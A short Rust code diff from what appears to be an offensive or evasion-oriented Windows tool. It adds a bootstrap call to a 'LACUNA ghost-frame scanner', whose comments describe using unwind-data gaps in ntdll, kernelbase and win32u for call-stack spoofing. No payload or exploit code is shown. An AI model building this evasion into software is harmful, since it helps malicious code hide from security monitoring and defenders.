@@ -169,6 +169,11 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
     // available on every Windows version from XP SP2 through 11 25H2.
     let _ = nyx_protocol::crypto::register_csprng(csprng_fill);
     diag_mark(b"7_csprng");
+    // ---- LACUNA ghost-frame scanner ------------------------------------------
+    // Scan .pdata lacunae in ntdll/kernelbase/win32u for call-stack spoofing.
+    // Ghost addresses in .pdata gaps are treated as leaf frames by RtlVirtualUnwind.
+    crate::lacuna::bootstrap_scan();
+    diag_mark(b"8_lacuna");
 
     Some(ntdll)
 }
